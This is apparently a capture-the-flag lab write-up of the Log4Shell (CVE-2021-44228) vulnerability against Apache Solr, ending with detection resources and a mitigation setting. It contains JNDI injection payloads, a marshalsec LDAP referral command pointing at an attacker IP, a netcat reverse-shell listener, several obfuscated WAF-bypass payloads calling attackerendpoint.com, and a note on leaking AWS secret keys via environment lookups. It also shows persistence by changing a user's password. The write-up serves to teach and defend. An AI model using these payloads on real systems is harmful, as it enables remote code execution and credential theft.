# CVE-2021-44228: Log4Shell Vulnerability Reference
## 📌 Introduction
On December 9th, 2021, a critical vulnerability was identified in the Java logging package log4j, designated as CVE-2021-44228. This vulnerability is highly significant due to the ubiquitous nature of the log4j package, which is used as a dependency in millions of applications and software providers globally.
- **Attack Name**: Log4Shell
- **Severity Score**: 10.0
- **Impact**: Enables trivial remote code executuion on hosts interacting with software utilizing vulnerable log4j versions.
- **Comparison**: Security researches have compare its massive attack surface to the Shellshock vulnerability.
  
## 🛠️ Mitigation and Patching
A patched version of log4j is available to address this critical flaw. Users and organizations are urged to update their codebases and monitor downstream vendor updates.  
- **Safe Version**: Log4j version 2.16.0 or higher.
- **Key Fixes in 2.16.0**:
  - JNDI is fully disabled.
  - Support for Message Lookups has been removed.
  - Addresses the DoS vulnerability CVE-2021-45046.

# 🚀 Tasks Writeups
## Task 2 Reconnaissance
The target virtual machine includes software that utilizes this vulnerability. <br>
Start the reconnaissance using nmap scan. <br>

`nmap -sV -p- 10.48.170.15`<br>

<p align="center">
<img width="325" height="35" alt="image53" src="https://github.com/user-attachments/assets/846ef2fc-c4ee-4425-9c4e-bd37516499d6" />
</p>

Q1: What service is running on port 8983? (Just the name of the software)<br>
Ans: **Apache Solr**

## Task 3 Discovery
This target machine is running Apache Solr 8.11.0, one example of software that is known to include this vulnerable log4j package. For the sake of showcasing this vulnerability, the application runs on Java 1.8.0_181.

Q1: Take a close look at the first page visible when navigating to http://MACHINE_IP:8983 . You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the -Dsolr.log.dir argument set to, displayed on the front page?<br>
Navigating through the web interface, here is what i've found.

<p align="center">
<img width="186" height="19" alt="image34" src="https://github.com/user-attachments/assets/14bd7da4-d3d4-4f43-8416-92f52864b6f9" />
</p>

Ans: **/var/solr/logs**

Q2: One file has a significant number of INFO entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed)<br><br>
Download the task file and read the file. I'm using the `cat solr.log | grep "INFO"` command.<br>

<p align="center">
<img width="919" height="215" alt="image18" src="https://github.com/user-attachments/assets/6e4eba8c-3fdd-456d-9768-f37299f58827" />
</p>

Ans: **sorl.log**

Q3: What "path" or URL endpoint is indicated in these repeated entries?<br><br>

The path is taking us to the /admin/cores

Ans: **/admin/cores**

Q4: Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)<br><br>

We also see the field that we can control using the params field.<br>
<p align="center">
<img width="74" height="19" alt="image80" src="https://github.com/user-attachments/assets/661b6e1c-f721-4385-881f-40a9c0bddfe5" />
</p>

Ans: **params**

## Task 4 Proof of Concept
Since we know that we can use the params to utilize our attack, now we can try it.
- Prepare the netcat listener
  `nc -lvnp 9999`
<img width="358" height="79" alt="image33" src="https://github.com/user-attachments/assets/b68a9b6d-8d92-4681-bf52-1f8daab0a166" />

This time, we use the JNDI request payload as syntax.
<img width="992" height="220" alt="image47" src="https://github.com/user-attachments/assets/8aef1cd3-c60d-4efb-8612-cd39a4f13b84" />
<img width="394" height="130" alt="image73" src="https://github.com/user-attachments/assets/6c61a443-e7c5-4626-8bab-116e63c8c9a8" />

## Task 5 Exploitation
In the previous task, we already achived the connection. But, it made an LDAP request so our listener may have seen was non-printable characters. Now, we can build upon this foundation to respond with a real LDAP handler.
<br>
We will utilize a open-source and public utility to stage an "LDAP Referral Server". This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so:
- ${jndi:ldap://attackerserver:1389/Resource} -> reaches out to our LDAP Referral Server
- LDAP Referral Server springboards the request to a secondary http://attackerserver/resource
- The victim retrieves and executes the code present in http://attackerserver/resource
  
This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000):
- python3 -m http.server
- php -S 0.0.0.0:8000
- (or any other busybox httpd or formal web service you might like)

Let's move our working directory to `/root/Rooms/solar/marshalsec` <br>
Run the command to build the marshalsec utils: <br>
`mvn clean package -DskipTests`

Now it's built, we can start an LDAP referral server to direct connections to our secondary HTTP server.<br>
`java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"`
<img width="963" height="63" alt="image78" src="https://github.com/user-attachments/assets/95ac453a-c8ee-4199-b452-af87566b5d65" />

Next, we create our exploit file. I named it Exploit.java<br>
It looks like this.
<img width="947" height="794" alt="image71" src="https://github.com/user-attachments/assets/9254bb64-a15d-4ae7-a312-d68c3f9f721a" />
and compiled it.
<img width="724" height="50" alt="image52" src="https://github.com/user-attachments/assets/f002fa21-d2b4-4b8e-8cf1-0bae90fe5bed" />

For our forwarding LDAP Refferal Server i will use a `python3 -m http.server` <br>
<img width="543" height="43" alt="image76" src="https://github.com/user-attachments/assets/ad272fbf-935f-45e8-b5aa-7b30fb187b01" />

Now we set our listener and making a request using the JNDI exploit same as the previous task.
<img width="964" height="161" alt="image45" src="https://github.com/user-attachments/assets/636674cb-958c-43de-be98-307b9c005891" />
<img width="380" height="57" alt="image43" src="https://github.com/user-attachments/assets/c0c803d5-5b32-44c8-b27c-9c108d2400bb" />

and we have got a printable shell.<br>
<img width="391" height="251" alt="image25" src="https://github.com/user-attachments/assets/427168e3-b8ac-466a-9318-7060870ad89d" />

## Task 6 Persistence

Q1: What user are you?<br>
we can validate this using `whoami`<br>
<img width="91" height="40" alt="image11" src="https://github.com/user-attachments/assets/065410f0-1486-4b49-9467-45ecfcc87962" />

Ans: **solr**
<br>

Next, i want to ssh to solr. Since we've got a reverse shell i will change the password.
<img width="849" height="290" alt="image22" src="https://github.com/user-attachments/assets/92b17f01-695f-4ea4-b414-8b3bab20cd7b" />
<img width="726" height="670" alt="image60" src="https://github.com/user-attachments/assets/94314dd4-fd35-48cd-88bf-04ca79232063" />

## Task 7 Detection
Unfortunately, finding applications vulnerable to CVE-2021-44228 "Log4Shell" is hard.<br>

Detecting exploitation might be even harder, considering the unlimited amount of potential bypasses. <br>

With that said, the information security community has seen an incredible outpouring of effort and support to develop tooling, script, and code to better constrain this threat. While this room won't showcase every technique in detail, you can again find an enormous amount of resources online.
<br>
Below are snippets that might help either effort:

- https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes (local, based off hashes of log4j JAR files)
- https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d (local, based off hashes of log4j CLASS files)
- https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228 (listing of vulnerable JAR and CLASS hashes)
- https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1 (local, hunting for vulnerable log4j packages in PowerShell)
- https://github.com/darkarnium/CVE-2021-44228 (local, YARA rules)
<br>

As a reminder, a massive resource is available here: 

https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/
## Task 8 Bypasses
The JNDI payload that we have showcased is the standard and "typical" syntax for performing this attack.<br>

If you are a penetration tester or a red teamer, this syntax might be caught by web application firewalls (WAFs) or easily detected. If you are a blue teamer or incident responder, you should be actively hunting for and detecting that syntax.<br>

Because this attack leverages log4j, the payload can ultimately access all of the same expansion, substitution, and templating tricks that the package makes available. This means that a threat actor could use any sort of tricks to hide, mask, or obfuscate the payload.<br>

With that in mind, there are honestly an unlimited number of bypasses to sneak in this syntax. While we will not be diving into the details in this exercise, you are encouraged to play with them in this environment. Read them carefully to understand what tricks are being used to masquerade the original syntax.<br>

There are numerous resources online that showcase some examples of these bypasses, with a few offered below:


${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}<br>
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}<br>
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}<br>
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}<br>
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}<br>
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}<br>
${${::-j}ndi:rmi://attackerendpoint.com/}<br>
Note the use of the rmi:// protocol in the last one. This is also another valid technique that can be used with the marshalsec utility -- feel free to experiment!<br>

Additionally, within the log4j engine, you can expand arbitrary environment variables (if this wasn't already bad enough). Consider the damage that could be done even with remote code execution, but a simple LDAP connection and exfiltration of ${env:AWS_SECRET_ACCESS_KEY}<br>

For other techniques, you are strongly encouraged t do your own research. There is a significant amount of information being shared in this Reddit thread: https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/

## Task 9 Mitigation
One option is to manually modify the solr.in.sh file with a specific syntax. Let's go down that route for the sake of showcasing this defensive tactic.<br>
Locate the solr.in.sh.<br>
<img width="335" height="57" alt="image7" src="https://github.com/user-attachments/assets/17589989-fef6-4b8e-af4f-a9a71417cd0e" />

Q1: What is the full path of the specific solr.in.sh file?<br>
Ans: **/etc/default/solr.in.sh**
<br>
The Apache Solr website Security page explains that you can add this specific syntax to the solr.in.sh file:<br>

`SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"`

Modify the solr.in.sh file with a text editor of your choice. You will need a sudo prefix to borrow root privileges if you are not already root. <br>

Scroll to the bottom of the file, and add a new line with the above syntax. Save and close the file.<br>
<img width="981" height="149" alt="image74" src="https://github.com/user-attachments/assets/d3db9f5c-0fd8-4de5-a5d1-2c9a2504f0a9" />

Now, we cannot get the reverse shell.
  
